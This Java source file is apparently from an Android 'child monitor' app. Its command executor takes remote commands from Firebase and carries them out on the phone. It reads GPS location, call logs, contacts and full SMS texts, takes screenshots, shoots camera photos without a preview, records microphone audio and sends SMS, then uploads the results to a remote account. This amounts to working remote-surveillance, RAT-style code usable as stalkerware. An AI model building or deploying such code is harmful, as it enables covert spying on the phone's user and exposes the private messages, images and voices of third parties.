// CommandExecutor.java
package com.childmonitorai;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import android.provider.CallLog;
import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.net.Uri;
import android.provider.Telephony;
import android.os.Vibrator;
import android.graphics.Bitmap;
import android.view.View;
import android.app.Activity;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Looper;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import java.io.ByteArrayOutputStream;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.Locale;
import java.util.HashMap;
import java.util.Map;

import android.hardware.Camera;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CaptureRequest;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import java.nio.ByteBuffer;
import android.media.MediaRecorder;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class CommandExecutor {
    private static final String TAG = "CommandExecutor";
    private static final int MAX_RETRY_ATTEMPTS = 3;
    private static final int RETRY_DELAY_MS = 3000;
    private DatabaseReference mDatabase;
    private String userId;
    private String deviceId;
    private Context context;
    private ScreenshotHelper screenshotHelper;
    private FirebaseStorageHelper firebasestorageHelper;
    private CompressService compressService;

    public CommandExecutor(String userId, String deviceId, Context context) {
        this.userId = userId;
        this.deviceId = deviceId;
        this.context = context;
        this.mDatabase = FirebaseDatabase.getInstance().getReference();
        this.screenshotHelper = new ScreenshotHelper(context);
        this.firebasestorageHelper = new FirebaseStorageHelper(); // Initialize FirebaseStorageHelper
        this.compressService = new CompressService();
    }

    public void setScreenshotHelper(ScreenshotHelper helper) {
        this.screenshotHelper = helper;
    }

    public void executeCommand(Command command, String date, String timestamp) {
        if (command == null) return;

        String commandName = command.getCommand();
        Log.d(TAG, "Executing command: " + commandName);

        try {
            switch (commandName) {
                case "get_location":
                    fetchLocation(date, timestamp);
                    break;
                case "recover_calls":
                    String phoneNumber = command.getParam("phone_number", "unknown");
                    int dataCount = Integer.parseInt(command.getParam("data_count", "15"));
                    recoverCalls(date, timestamp, phoneNumber, dataCount);
                    break;
                case "retrieve_contacts":
                    retrieveContacts(date, timestamp);
                    break;
                case "recover_sms":
                    phoneNumber = command.getParam("phone_number", "unknown");
                    dataCount = Integer.parseInt(command.getParam("data_count", "15"));
                    recoverSms(date, timestamp, phoneNumber, dataCount);
                    break;
                case "vibrate":
                    int duration = Integer.parseInt(command.getParam("duration", "1")) * 1000; // Convert seconds to milliseconds
                    vibratePhone(date, timestamp, duration);
                    break;
                case "take_screenshot":
                    takeScreenshot(date, timestamp);
                    break;
                case "take_picture":
                    String cameraFacing = command.getParam("camera", "rear");
                    boolean useFlash = Boolean.parseBoolean(command.getParam("flash", "false"));
                    takePicture(date, timestamp, cameraFacing, useFlash);
                    break;
                case "record_audio":
                    int durationMinutes = Integer.parseInt(command.getParam("duration", "1")); // Duration in minutes
                    recordAudio(date, timestamp, durationMinutes);
                    break;
                case "send_sms":
                    phoneNumber = command.getParam("phone_number", "");
                    String message = command.getParam("message", "");
                    sendSMS(date, timestamp, phoneNumber, message);
                    break;
                default:
                    updateCommandStatus(date, timestamp, "failed", "Unknown command: " + commandName);
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error executing command: " + commandName, e);
            updateCommandStatus(date, timestamp, "failed", "Error: " + e.getMessage());
        }
    }

    private void fetchLocation(String date, String timestamp) {
        if (ActivityCompat.checkSelfPermission(context,
                android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            updateCommandStatus(date, timestamp, "failed", "Location permission not granted");
            return;
        }

        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        if (locationManager == null) {
            updateCommandStatus(date, timestamp, "failed", "Location service unavailable");
            return;
        }

        try {
            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }

            if (location != null) {
                String result = String.format(Locale.US, "Latitude: %.6f, Longitude: %.6f",
                        location.getLatitude(), location.getLongitude());
                updateCommandStatus(date, timestamp, "completed", result);
            } else {
                updateCommandStatus(date, timestamp, "failed", "Unable to get location");
            }
        } catch (SecurityException e) {
            updateCommandStatus(date, timestamp, "failed", "Location permission denied");
        }
    }

    private void recoverCalls(String date, String timestamp, String phoneNumber, int dataCount) {
        if (ActivityCompat.checkSelfPermission(context,
                android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            updateCommandStatus(date, timestamp, "failed", "Call log permission not granted");
            return;
        }

        ContentResolver contentResolver = context.getContentResolver();
        String selection = "unknown".equals(phoneNumber) ? null : CallLog.Calls.NUMBER + "=?";
        String[] selectionArgs = "unknown".equals(phoneNumber) ? null : new String[]{phoneNumber};

        try (Cursor cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                new String[]{
                        CallLog.Calls.NUMBER,
                        CallLog.Calls.DATE,
                        CallLog.Calls.TYPE,
                        CallLog.Calls.DURATION
                },
                selection,
                selectionArgs,
                CallLog.Calls.DATE + " DESC")) {

            if (cursor == null) {
                updateCommandStatus(date, timestamp, "failed", "Unable to access call logs");
                return;
            }

            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
            int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);

            if (numberIndex == -1 || dateIndex == -1 || typeIndex == -1 || durationIndex == -1) {
                updateCommandStatus(date, timestamp, "failed", "Missing required call log fields");
                return;
            }

            StringBuilder result = new StringBuilder();
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            int count = 0;

            while (cursor.moveToNext() && count < dataCount) {
                String number = cursor.getString(numberIndex);
                long callDate = cursor.getLong(dateIndex);
                int callType = cursor.getInt(typeIndex);
                int duration = cursor.getInt(durationIndex);

                result.append("Call ").append(count + 1).append(":\n")
                        .append("Number: ").append(number).append("\n")
                        .append("Date: ").append(dateFormat.format(new Date(callDate))).append("\n")
                        .append("Type: ").append(getCallTypeString(callType)).append("\n")
                        .append("Duration: ").append(duration).append(" seconds\n\n");

                count++;
            }

            String finalResult = count > 0 ? result.toString() :
                    "No call logs found" + ("unknown".equals(phoneNumber) ? "" : " for " + phoneNumber);
            updateCommandStatus(date, timestamp, "completed", finalResult);

        } catch (Exception e) {
            updateCommandStatus(date, timestamp, "failed", "Error accessing call logs: " + e.getMessage());
        }
    }

    private void retrieveContacts(String date, String timestamp) {
        if (ActivityCompat.checkSelfPermission(context,
                android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            updateCommandStatus(date, timestamp, "failed", "Contacts permission not granted");
            return;
        }

        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cursor == null) {
            updateCommandStatus(date, timestamp, "failed", "Unable to access contacts");
            return;
        }

        int idIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID);
        int nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);

        if (idIndex == -1 || nameIndex == -1) {
            updateCommandStatus(date, timestamp, "failed", "Missing required contact fields");
            cursor.close();
            return;
        }

        StringBuilder result = new StringBuilder();
        int count = 0;

        while (cursor.moveToNext()) {
            String contactId = cursor.getString(idIndex);
            String name = cursor.getString(nameIndex);

            Cursor phones = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                    new String[]{contactId}, null);

            if (phones != null) {
                int phoneNumberIndex = phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

                if (phoneNumberIndex == -1) {
                    updateCommandStatus(date, timestamp, "failed", "Missing required phone number field");
                    phones.close();
                    cursor.close();
                    return;
                }

                while (phones.moveToNext()) {
                    String phoneNumber = phones.getString(phoneNumberIndex);
                    result.append("Contact ").append(count + 1).append(":\n")
                            .append("Name: ").append(name).append("\n")
                            .append("Phone Number: ").append(phoneNumber).append("\n\n");
                    count++;
                }

                phones.close();
            }
        }

        cursor.close();

        String finalResult = count > 0 ? result.toString() : "No contacts found";
        updateCommandStatus(date, timestamp, "completed", finalResult);
    }

    private void recoverSms(String date, String timestamp, String phoneNumber, int dataCount) {
        if (ActivityCompat.checkSelfPermission(context,
                android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            updateCommandStatus(date, timestamp, "failed", "SMS permission not granted");
            return;
        }

        ContentResolver contentResolver = context.getContentResolver();
        String selection = "unknown".equals(phoneNumber) ? null : Telephony.Sms.ADDRESS + "=?";
        String[] selectionArgs = "unknown".equals(phoneNumber) ? null : new String[]{phoneNumber};

        try (Cursor cursor = contentResolver.query(
                Uri.parse("content://sms"),
                new String[]{
                        Telephony.Sms.ADDRESS,
                        Telephony.Sms.DATE,
                        Telephony.Sms.BODY,
                        Telephony.Sms.TYPE
                },
                selection,
                selectionArgs,
                Telephony.Sms.DATE + " DESC")) {

            if (cursor == null) {
                updateCommandStatus(date, timestamp, "failed", "Unable to access SMS logs");
                return;
            }

            int addressIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
            int dateIndex = cursor.getColumnIndex(Telephony.Sms.DATE);
            int bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY);
            int typeIndex = cursor.getColumnIndex(Telephony.Sms.TYPE);

            if (addressIndex == -1 || dateIndex == -1 || bodyIndex == -1 || typeIndex == -1) {
                updateCommandStatus(date, timestamp, "failed", "Missing required SMS fields");
                return;
            }

            StringBuilder result = new StringBuilder();
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            int count = 0;

            while (cursor.moveToNext() && count < dataCount) {
                String address = cursor.getString(addressIndex);
                long smsDate = cursor.getLong(dateIndex);
                String body = cursor.getString(bodyIndex);
                int type = cursor.getInt(typeIndex);

                result.append("SMS ").append(count + 1).append(":\n")
                        .append("Address: ").append(address).append("\n")
                        .append("Date: ").append(dateFormat.format(new Date(smsDate))).append("\n")
                        .append("Type: ").append(getSmsTypeString(type)).append("\n")
                        .append("Body: ").append(body).append("\n\n");

                count++;
            }

            String finalResult = count > 0 ? result.toString() :
                    "No SMS logs found" + ("unknown".equals(phoneNumber) ? "" : " for " + phoneNumber);
            updateCommandStatus(date, timestamp, "completed", finalResult);

        } catch (Exception e) {
            updateCommandStatus(date, timestamp, "failed", "Error accessing SMS logs: " + e.getMessage());
        }
    }

    private void vibratePhone(String date, String timestamp, int duration) {
        Vibrator vibrator = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
        if (vibrator == null || !vibrator.hasVibrator()) {
            updateCommandStatus(date, timestamp, "failed", "Vibrator service unavailable");
            return;
        }

        vibrator.vibrate(duration);
        updateCommandStatus(date, timestamp, "completed", "Phone vibrated for " + (duration / 1000) + " seconds");
    }

    private void takeScreenshot(String date, String timestamp) {
        if (screenshotHelper == null || !screenshotHelper.hasMediaProjection()) {
            updateCommandStatus(date, timestamp, "failed", "Screenshot service not properly initialized");
            return;
        }

        try {
            byte[] screenshotData = screenshotHelper.takeScreenshot();
            if (screenshotData == null) {
                updateCommandStatus(date, timestamp, "failed", "Failed to capture screenshot");
                return;
            }

            StorageReference storageRef = FirebaseStorage.getInstance().getReference();
            StorageReference screenshotRef = storageRef.child("screenshots/" + userId + "/" + deviceId + "/" + date + "_" + timestamp + ".png");

            screenshotRef.putBytes(screenshotData)
                .addOnSuccessListener(taskSnapshot -> screenshotRef.getDownloadUrl().addOnSuccessListener(uri -> {
                    String downloadUrl = uri.toString();
                    updateCommandStatus(date, timestamp, "completed", "Screenshot URL: " + downloadUrl);
                }))
                .addOnFailureListener(e -> updateCommandStatus(date, timestamp, "failed", "Error uploading screenshot: " + e.getMessage()));
        } catch (Exception e) {
            updateCommandStatus(date, timestamp, "failed", "Error taking screenshot: " + e.getMessage());
        }
    }

    private void takePicture(String date, String timestamp, String cameraFacing, boolean useFlash) {
        // Initial status update
        updateCommandStatus(date, timestamp, "in_progress", "Initializing camera...");

        // Permission check
        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            updateCommandStatus(date, timestamp, "failed", "Camera permission not granted");
            return;
        }

        // Network check
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        if (activeNetwork == null || !activeNetwork.isConnected()) {
            updateCommandStatus(date, timestamp, "delayed", "Waiting for network connectivity");
            scheduleRetry(() -> takePicture(date, timestamp, cameraFacing, useFlash), 0);
            return;
        }

        CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        if (cameraManager == null) {
            updateCommandStatus(date, timestamp, "failed", "Camera service unavailable");
            return;
        }

        try {
            // Update status to show camera setup progress
            updateCommandStatus(date, timestamp, "in_progress", "Setting up camera...");

            String cameraId = null;
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (facing != null) {
                    if ("front".equals(cameraFacing) && 
                        facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        cameraId = id;
                        break;
                    } else if ("rear".equals(cameraFacing) && 
                             facing == CameraCharacteristics.LENS_FACING_BACK) {
                        cameraId = id;
                        break;
                    }
                }
            }

            if (cameraId == null) {
                updateCommandStatus(date, timestamp, "failed", 
                    "Requested camera (" + cameraFacing + ") not available");
                return;
            }

            ImageReader reader = ImageReader.newInstance(1920, 1080, 
                android.graphics.ImageFormat.JPEG, 1);
            reader.setOnImageAvailableListener(imageReader -> {
                try (android.media.Image image = imageReader.acquireLatestImage()) {
                    if (image == null) {
                        updateCommandStatus(date, timestamp, "failed", "Failed to capture image");
                        return;
                    }

                    updateCommandStatus(date, timestamp, "in_progress", "Processing captured image...");
                    
                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.capacity()];
                    buffer.get(bytes);
                    
                    // Compress the image before uploading
                    byte[] compressedBytes = compressService.compressImage(bytes);
                    if (compressedBytes == null) {
                        updateCommandStatus(date, timestamp, "failed", "Failed to compress image");
                        return;
                    }
                    
                    String fileName = "photo_" + timestamp + ".jpg";
                    String deviceModel = android.os.Build.MODEL;
                    
                    FirebaseUser currentUser = FirebaseAuth.getInstance().getCurrentUser();
                    if (currentUser == null) {
                        updateCommandStatus(date, timestamp, "failed", "No user signed in");
                        return;
                    }
                    String userId = currentUser.getUid();

                    updateCommandStatus(date, timestamp, "in_progress", "Uploading compressed image...");

                    // Upload the compressed image
                    firebasestorageHelper.uploadImage(userId, deviceModel, date, fileName, compressedBytes,
                        new FirebaseStorageHelper.UploadCallback() {
                            @Override
                            public void onSuccess(String downloadUrl) {
                                if (downloadUrl != null && !downloadUrl.isEmpty()) {
                                    updateCommandStatus(date, timestamp, "completed", downloadUrl);
                                } else {
                                    updateCommandStatus(date, timestamp, "failed", "Upload completed but URL is empty");
                                }
                            }

                            @Override
                            public void onFailure(String error) {
                                handleUploadFailure(date, timestamp, "photo", error, 0,
                                    () -> takePicture(date, timestamp, cameraFacing, useFlash));
                            }
                        });
                } catch (Exception e) {
                    updateCommandStatus(date, timestamp, "failed", "Error processing image: " + e.getMessage());
                }
            }, null);

            HandlerThread thread = new HandlerThread("CameraThread");
            thread.start();
            Handler handler = new Handler(thread.getLooper());

            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                private CameraDevice cameraDevice;

                @Override
                public void onOpened(CameraDevice camera) {
                    this.cameraDevice = camera;
                    try {
                        CaptureRequest.Builder requestBuilder = 
                            camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        requestBuilder.addTarget(reader.getSurface());
                        
                        if (useFlash) {
                            requestBuilder.set(CaptureRequest.FLASH_MODE, 
                                CaptureRequest.FLASH_MODE_SINGLE);
                        }

                        camera.createCaptureSession(Arrays.asList(reader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    try {
                                        session.capture(requestBuilder.build(), null, handler);
                                    } catch (Exception e) {
                                        updateCommandStatus(date, timestamp, "failed", 
                                            "Failed to capture: " + e.getMessage());
                                    }
                                }

                                @Override
                                public void onConfigureFailed(CameraCaptureSession session) {
                                    updateCommandStatus(date, timestamp, "failed", 
                                        "Failed to configure camera session");
                                }
                            }, handler);
                    } catch (Exception e) {
                        updateCommandStatus(date, timestamp, "failed", 
                            "Camera setup error: " + e.getMessage());
                    }
                }

                @Override
                public void onDisconnected(CameraDevice camera) {
                    if (this.cameraDevice != null) {
                        this.cameraDevice.close();
                    }
                }

                @Override
                public void onError(CameraDevice camera, int error) {
                    updateCommandStatus(date, timestamp, "failed", 
                        "Camera device error: " + error);
                    if (this.cameraDevice != null) {
                        this.cameraDevice.close();
                    }
                }
            }, handler);
        } catch (Exception e) {
            updateCommandStatus(date, timestamp, "failed", 
                "Camera error: " + e.getMessage());
        }
    }

    private void recordAudio(String date, String timestamp, int durationMinutes) {
        if (ActivityCompat.checkSelfPermission(context, 
                android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            updateCommandStatus(date, timestamp, "failed", "Audio recording permission not granted");
            return;
        }

        File outputFile = new File(context.getCacheDir(), "audio_" + timestamp + ".mp3");
        MediaRecorder mediaRecorder = new MediaRecorder();

        try {
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setOutputFile(outputFile.getAbsolutePath());
            mediaRecorder.prepare();
            mediaRecorder.start();

            // Schedule recording stop after specified duration
            new Handler().postDelayed(() -> {
                try {
                    mediaRecorder.stop();
                    mediaRecorder.release();

                    // Read the file into byte array
                    byte[] audioData = new byte[(int) outputFile.length()];
                    FileInputStream fis = new FileInputStream(outputFile);
                    fis.read(audioData);
                    fis.close();

                    // Delete the temporary file
                    outputFile.delete();

                    // Upload the audio file
                    String fileName = "audio_" + timestamp + ".mp3";
                    String deviceModel = android.os.Build.MODEL;
                    
                    FirebaseUser currentUser = FirebaseAuth.getInstance().getCurrentUser();
                    if (currentUser == null) {
                        updateCommandStatus(date, timestamp, "failed", "No user signed in");
                        return;
                    }
                    String userId = currentUser.getUid();

                    firebasestorageHelper.uploadAudio(userId, deviceModel, date, fileName, audioData,
                        new FirebaseStorageHelper.UploadCallback() {
                            @Override
                            public void onSuccess(String downloadUrl) {
                                updateCommandStatus(date, timestamp, "completed", 
                                    "Audio recording URL: " + downloadUrl);
                            }

                            @Override
                            public void onFailure(String error) {
                                updateCommandStatus(date, timestamp, "failed", 
                                    "Failed to upload audio: " + error);
                            }
                        });

                } catch (Exception e) {
                    updateCommandStatus(date, timestamp, "failed", 
                        "Error finishing audio recording: " + e.getMessage());
                }
            }, durationMinutes * 60 * 1000); // Convert minutes to milliseconds

            updateCommandStatus(date, timestamp, "in_progress", 
                "Recording started for " + durationMinutes + " minutes");

        } catch (IOException e) {
            mediaRecorder.release();
            updateCommandStatus(date, timestamp, "failed", "Error starting audio recording: " + e.getMessage());
        }
    }

    private void sendSMS(String date, String timestamp, String phoneNumber, String message) {
        if (ActivityCompat.checkSelfPermission(context,
                android.Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            updateCommandStatus(date, timestamp, "failed", "SMS sending permission not granted");
            return;
        }

        if (phoneNumber.isEmpty() || message.isEmpty()) {
            updateCommandStatus(date, timestamp, "failed", "Phone number or message is empty");
            return;
        }

        try {
            updateCommandStatus(date, timestamp, "in_progress", "Sending SMS...");
            
            android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
            ArrayList<String> parts = smsManager.divideMessage(message);
            final int totalParts = parts.size();
            final int[] sentParts = {0};
            final int[] deliveredParts = {0};
            
            ArrayList<PendingIntent> sentIntents = new ArrayList<>();
            ArrayList<PendingIntent> deliveredIntents = new ArrayList<>();

            // Create unique request codes for PendingIntents
            int uniqueRequestCode = (int) System.currentTimeMillis();

            // Intent for SMS sent status
            String SENT_ACTION = "com.childmonitorai.SMS_SENT_" + timestamp;
            Intent sentIntent = new Intent(SENT_ACTION);
            sentIntent.setPackage(context.getPackageName());
            PendingIntent sentPI = PendingIntent.getBroadcast(context, uniqueRequestCode,
                    sentIntent, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);

            // Intent for SMS delivered status
            String DELIVERED_ACTION = "com.childmonitorai.SMS_DELIVERED_" + timestamp;
            Intent deliveredIntent = new Intent(DELIVERED_ACTION);
            deliveredIntent.setPackage(context.getPackageName());
            PendingIntent deliveredPI = PendingIntent.getBroadcast(context, uniqueRequestCode,
                    deliveredIntent, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);

            // Register receivers with explicit exported flags
            IntentFilter sentFilter = new IntentFilter(SENT_ACTION);
            context.registerReceiver(new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    sentParts[0]++;
                    boolean isSuccess = getResultCode() == Activity.RESULT_OK;
                    
                    if (sentParts[0] == totalParts) {
                        if (isSuccess) {
                            updateCommandStatus(date, timestamp, "in_progress", 
                                "SMS sent successfully to " + phoneNumber + ", waiting for delivery");
                        } else {
                            updateCommandStatus(date, timestamp, "failed", 
                                "Failed to send SMS: Error code " + getResultCode());
                        }
                    }
                    
                    if (sentParts[0] == totalParts) {
                        try {
                            context.unregisterReceiver(this);
                        } catch (Exception e) {
                            Log.e(TAG, "Error unregistering sent receiver", e);
                        }
                    }
                }
            }, sentFilter, Context.RECEIVER_NOT_EXPORTED);

            IntentFilter deliveredFilter = new IntentFilter(DELIVERED_ACTION);
            context.registerReceiver(new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    deliveredParts[0]++;
                    boolean isSuccess = getResultCode() == Activity.RESULT_OK;
                    
                    if (deliveredParts[0] == totalParts) {
                        updateCommandStatus(date, timestamp, isSuccess ? "completed" : "failed", 
                            isSuccess ? "SMS delivered successfully to " + phoneNumber 
                                    : "SMS delivery failed: Error code " + getResultCode());
                        
                        try {
                            context.unregisterReceiver(this);
                        } catch (Exception e) {
                            Log.e(TAG, "Error unregistering delivered receiver", e);
                        }
                    }
                }
            }, deliveredFilter, Context.RECEIVER_NOT_EXPORTED);

            // Add PendingIntents for each message part
            for (int i = 0; i < parts.size(); i++) {
                sentIntents.add(sentPI);
                deliveredIntents.add(deliveredPI);
            }

            // Send the SMS
            smsManager.sendMultipartTextMessage(phoneNumber, null, parts, sentIntents, deliveredIntents);

        } catch (Exception e) {
            updateCommandStatus(date, timestamp, "failed", "Error sending SMS: " + e.getMessage());
        }
    }

    private String getCallTypeString(int callType) {
        switch (callType) {
            case CallLog.Calls.INCOMING_TYPE: return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE: return "Outgoing";
            case CallLog.Calls.MISSED_TYPE: return "Missed";
            case CallLog.Calls.VOICEMAIL_TYPE: return "Voicemail";
            case CallLog.Calls.REJECTED_TYPE: return "Rejected";
            case CallLog.Calls.BLOCKED_TYPE: return "Blocked";
            default: return "Unknown";
        }
    }

    private String getSmsTypeString(int type) {
        switch (type) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "Inbox";
            case Telephony.Sms.MESSAGE_TYPE_SENT: return "Sent";
            case Telephony.Sms.MESSAGE_TYPE_DRAFT: return "Draft";
            case Telephony.Sms.MESSAGE_TYPE_OUTBOX: return "Outbox";
            case Telephony.Sms.MESSAGE_TYPE_FAILED: return "Failed";
            case Telephony.Sms.MESSAGE_TYPE_QUEUED: return "Queued";
            default: return "Unknown";
        }
    }

    private void updateCommandStatus(String date, String timestamp, String status, String result) {
        DatabaseReference commandRef = mDatabase.child("users").child(userId)
                .child("phones").child(deviceId).child("commands")
                .child(date).child(timestamp);

        Map<String, Object> updates = new HashMap<>();
        updates.put("status", status);
        if (result != null) {
            updates.put("result", result);
        }
        updates.put("lastUpdated", ServerValue.TIMESTAMP);

        commandRef.updateChildren(updates)
            .addOnFailureListener(e -> {
                // If database update fails, retry with exponential backoff
                retryDatabaseUpdate(commandRef, updates, 0);
            });
    }

    private void retryDatabaseUpdate(DatabaseReference ref, Map<String, Object> updates, 
                                   int retryCount) {
        if (retryCount >= MAX_RETRY_ATTEMPTS) {
            Log.e(TAG, "Failed to update command status after " + MAX_RETRY_ATTEMPTS + " attempts");
            return;
        }

        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            ref.updateChildren(updates)
                .addOnFailureListener(e -> retryDatabaseUpdate(ref, updates, retryCount + 1));
        }, RETRY_DELAY_MS * (retryCount + 1));
    }

    private void handleUploadFailure(String date, String timestamp, String type, 
                                   String error, int retryCount, Runnable retryAction) {
        if (retryCount < MAX_RETRY_ATTEMPTS) {
            updateCommandStatus(date, timestamp, "retrying", 
                "Upload failed, attempt " + (retryCount + 1) + ": " + error);
            scheduleRetry(retryAction, retryCount);
        } else {
            updateCommandStatus(date, timestamp, "failed", 
                "Upload failed after " + MAX_RETRY_ATTEMPTS + " attempts: " + error);
        }
    }

    private void scheduleRetry(Runnable action, int currentRetryCount) {
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            ConnectivityManager cm = (ConnectivityManager) 
                context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            
            if (activeNetwork != null && activeNetwork.isConnected()) {
                action.run();
            } else if (currentRetryCount < MAX_RETRY_ATTEMPTS) {
                scheduleRetry(action, currentRetryCount + 1);
            }
        }, RETRY_DELAY_MS * (currentRetryCount + 1));
    }
}